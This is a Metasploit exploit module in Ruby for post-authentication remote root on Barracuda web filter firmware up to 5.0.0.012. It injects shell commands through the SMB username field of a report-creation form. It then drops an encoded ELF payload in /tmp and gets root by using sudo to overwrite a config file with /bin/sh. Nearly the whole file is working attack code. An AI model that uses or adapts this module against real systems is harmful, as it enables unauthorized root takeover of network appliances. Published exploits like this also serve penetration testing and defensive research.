# Exploit Title: Barracuda Firmware <= 5.0.0.012 Post Auth Remote Root exploit
# Exploit Author: xort
# Vendor Homepage: https://www.barracuda.com/
# Software Link: https://www.barracuda.com/products/webfilter
# Version: Firmware <= 5.0.0.012
# Tested on: Vx and Hardware platforms
#
# Postauth remote root in Barracuda Firmware <= 5.0.0.012 for any under priviledged user with report generating
# capablities. This exploit leverages a command injection bug along with poor sudo permissions to obtain
# root. xort@blacksecurity.org

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Barracuda Firmware <= 5.0.0.012 reporting Post Auth Remote Root',
					'Description'    => %q{
					This module exploits a remote command execution vulnerability in
				the Barracuda Firmware Version <= 5.0.0.012 by exploiting a
				vulnerability in the web administration interface.
					By sending a specially crafted request it's possible to inject system
				 commands while escalating to root do to relaxed sudo configuration on the local
				machine.
			},
			'Author'         =>
				[
					'xort', # metasploit module
				],
			'Version'        => '$Revision: 12345 $',
			'References'     =>
				[
					[ 'none', 'none'],
				],
			'Platform'      => [ 'linux'],
			'Privileged'     => true,
			 'Arch'          => [ ARCH_X86 ],
                        'SessionTypes'  => [ 'shell' ],
                        'Privileged'     => false,

		        'Payload'        =>
                                { # note: meterpreter can't run on host do to kernel 2.4 incompatabilities + this is stable
                                  'Compat' =>
                                  {
                                        'ConnectionType' => 'find',
                                  }
                                },

			'Targets'        =>
				[
					['Linux Universal',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux'
						}
					],
				],
			'DefaultTarget' => 0))

			register_options(
				[
					OptString.new('PASSWORD', [ false, 'Device password', "" ]),
					OptString.new('ET', [ false, 'Device password', "" ]),
			         	OptString.new('USERNAME', [ true, 'Device password', "admin" ]),
					OptString.new('CMD', [ false, 'Command to execute', "" ]),
					Opt::RPORT(8000),
				], self.class)
	end

	def do_login(username, password, et)
		vprint_status( "Logging into machine with credentials...\n" )

	      # timeout
		timeout = 1550;

		# params
                password_clear = "admin"
		real_user = "";
		login_state = "out"
		enc_key = Rex::Text.rand_text_hex(32)
   		et = "1358817515"
		locale = "en_US"
		user = username
		password = Digest::MD5.hexdigest(username+enc_key)
		enctype = "MD5"
		password_entry = ""


		vprint_status( "Starting first routine...\n" )

                data = "real_user=#{real_user}&login_state=#{login_state}&enc_key=#{enc_key}&et=#{et}&locale=#{locale}&user=#{user}&password=#{password}&enctype=#{enctype}&password_entry=#{password_entry}&password_clear=#{password_clear}&Submit=Login"

		vprint_status( "#{data}\n" )

	        res = send_request_cgi(
      	        {
                      'method'  => 'POST',
                      'uri'     => "/cgi-mod/index.cgi",
                      'cookie'  => "",
		      'data'    => data
               }, timeout)


		vprint_status( "login got code: #{res.code} ... continuing to second request..." )
		File.open("/tmp/output2", 'w+') {|f| f.write(res.body) }

		# get rid of first yank
		password = res.body.split('\n').grep(/(.*)id=\"password\" value=\"(.*)\"/){$2}[0] #change to match below for more exact result
		et = res.body.split('\n').grep(/(.*)id=\"et\" value=\"([^\"]+)\"/){$2}[0]

		vprint_status( "password got back = #{password} - et got back = #{et}\n" )

		return password, et
	end

	def run_command(username, password, et, cmd)
		vprint_status( "Running Command...\n" )

	 	exploitreq = [
		[ "primary_tab", "BASIC" ],
		[ "secondary_tab","reports" ],
		[ "realm","" ],
		[ "auth_type","Local" ],
		[ "user", username ],
		[ "password", password  ],
		[ "et",et ],
		[ "role","" ],
		[ "locale","en_US" ],
		[ "q","" ],
		[ "UPDATE_new_report_time_frame","custom" ],
		[ "report_start","2013-01-25 01:14" ],
		[ "report_end","2013-01-25 02:14" ],
		[ "type","" ],
		[ "ntlm_server","" ],
		[ "kerb_server","" ],
		[ "local_group","changeme" ],
		[ "ip_group","20.20.108.0/0.0.0.0" ],
		[ "ip_address__0","" ],
		[ "ip_address__1","" ],
		[ "ip_address__2","" ],
		[ "ip_address__3","" ],
		[ "netmask__0","" ],
		[ "netmask__1","" ],
		[ "netmask__2","" ],
		[ "netmask__3","" ],
		[ "UPDATE_new_report_pattern_values","" ],
		[ "UPDATE_new_report_pattern_text","" ],
		[ "UPDATE_new_report_filter_destination","domain" ],
		[ "filter_domain","" ],
		[ "UPDATE_new_report_filter_domain","" ],
		[ "UPDATE_new_report_filter_category","" ],
		[ "UPDATE_new_report_exclude_from","" ],
		[ "UPDATE_new_report_exclude_to","" ],
		[ "UPDATE_new_report_exclude_days","" ],
		[ "allow","allow" ],
		[ "block","block" ],
		[ "warn","warn" ],
		[ "monitor","monitor" ],
		[ "UPDATE_new_report_filter_actions","allow,block,warn,monitor" ],
		[ "UPDATE_new_report_filter_count","10" ],
		[ "UPDATE_new_report_chart_type","vbar" ],
		[ "UPDATE_new_report_format","html" ],
		[ "DEFAULT_new_report_group_expand","No" ],
		[ "UPDATE_new_report_expand_user_count","5" ],
		[ "UPDATE_new_report_expand_domain_count","5" ],
		[ "UPDATE_new_report_expand_cat_count","5" ],
		[ "UPDATE_new_report_expand_url_count","5" ],
		[ "UPDATE_new_report_expand_threat_count","5" ],
		[ "report","on" ],
		[ "UPDATE_new_report_name", Rex::Text.rand_text_alphanumeric(10) ],
		[ "UPDATE_new_report_id","" ],
		[ "UPDATE_new_report_enabled","Yes" ],
		[ "secondary_scope","report" ],
		[ "secondary_scope_data","" ],
		[ "UPDATE_new_report_reports","sessions_by_user,infection_activity" ],
		[ "UPDATE_new_report_delivery","external" ],
		[ "UPDATE_new_report_delivery_dest_email","" ],
		[ "UPDATE_new_report_server","new" ],
		[ "UPDATE_new_external_server_type","smb" ],
		[ "UPDATE_new_external_server_alias", Rex::Text.rand_text_alphanumeric(10) ],
		[ "UPDATE_new_external_server","4.4.4.4" ],
		[ "UPDATE_new_external_server_port","445" ],
		[ "UPDATE_new_external_server_username","\"` #{cmd} `\"" ],
		[ "UPDATE_new_external_server_password","asdf" ],
		[ "UPDATE_new_external_server_path","/"+ Rex::Text.rand_text_alphanumeric(15) ],
		[ "UPDATE_new_report_frequency", "once" ],
		[ "UPDATE_new_report_split", "no" ],
		[ "add_report_id","Apply" ],
		[ "remover","" ]
		]


	        data = Rex::MIME::Message.new
		data.bound = "---------------------------" + Rex::Text.rand_text_numeric(30)

		exploitreq.each do |xreq|
       	 	    data.add_part(xreq[1], nil, nil, "form-data; name=\"" + xreq[0] + "\"")
		end

        	post_data = data.to_s
	        post_data = post_data.gsub(/\r\n---------------------------/, "---------------------------")

		datastore['UserAgent'] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0"

		vprint_status( "sending..." )
	        res = send_request_cgi({
         	   'method' => 'POST',
	           'uri'    => "/cgi-mod/index.cgi",
       		   'ctype'  => "multipart/form-data; boundary=#{data.bound}",
            	   'data'   => post_data,
		   'headers' =>
			{
				'Accept' => "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				'Accept-Language' => "en-US,en;q=0.5"
			}
	        })

		if res.code == 200
			vprint_status( "You can now reuse the login params you were supplied to avoid the lengthy wait at the exploits initial launch.... \n" )
			vprint_status( "password: #{password} et: #{et}\n" )
		end


		vprint_status( "login got code: #{res.code} from report_results.cgi\n" )
		File.open("/tmp/output4", 'w+') {|f| f.write(res.body) }
	end

	def run_script(username, password, et, cmds)
	  	vprint_status( "running script...\n")


	end

	def exploit
		# timeout
		timeout = 1550;

		user = "admin"

		# params
                real_user = "";
		login_state = "out"
                et = "1358817515" #epoch time
		locale = "en_US"
		user = "admin"
		password = ""
		enctype = "MD5"
		password_entry = ""
		password_clear = "admin"

                vprint_status("<- Encoding payload to elf string...")
                elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\\\\\\\\\x\1\2') # extra escaping to get passed down correctly

		if not datastore['PASSWORD'].nil? and not datastore['PASSWORD'].empty?

			password_clear = "admin"
			password = datastore['PASSWORD']
			et = datastore['ET']

                # else - if no 'CMD' string - add code for root shell
                else

			password, et = do_login(user, password, et)
			vprint_status("new password: #{password}\n")
		end

		sleep(5)

		if not datastore['CMD'].nil? and not datastore['CMD'].empty?
			cmd = datastore['CMD']
		end

		run_command(user, password, et, cmd)

		# create elf in /tmp, abuse sudo to overwrite another command we have sudo access to (tar), then execute with sudo perm
		cmd =  "echo -ne #{encoded_elf} > /tmp/x ;"
		cmd += "chmod +x /tmp/x ;"

		# backup static_routes file
		cmd += "cp -f /home/product/code/config/static_routes /tmp/zzz"
		cmd += "sudo cp -f /bin/sh /home/product/code/config/static_routes"

		# execute elf as root
		cmd += "sudo /home/product/code/config/static_routes -c /tmp/x ;"

		# restore static_routes file
		cmd += "cp -f /tmp/zzz /home/product/code/config/static_routes"


		run_command(user, password, et, cmd)
		sleep(2)
		handler
		sleep(5)

	end

end